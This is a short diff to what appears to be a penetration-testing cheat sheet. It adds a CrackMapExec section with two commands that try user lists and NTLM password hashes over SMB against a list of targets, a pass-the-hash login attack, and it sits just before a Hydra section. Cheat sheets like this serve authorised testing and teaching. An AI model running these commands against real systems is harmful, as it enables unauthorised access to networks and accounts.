@@ -1801,6 +1801,13 @@ Microsoft Windows [Version 10.0.16299.309]
 C:\Windows\system32>
 ```
 
+#### crackmapexec cme
+
+```
+cme smb targets.txt -u users.txt -H hashes.txt --local-auth
+cme smb targets.txt -u users.txt -H hashes.txt
+```
+
 ### Hydra
 
 ```
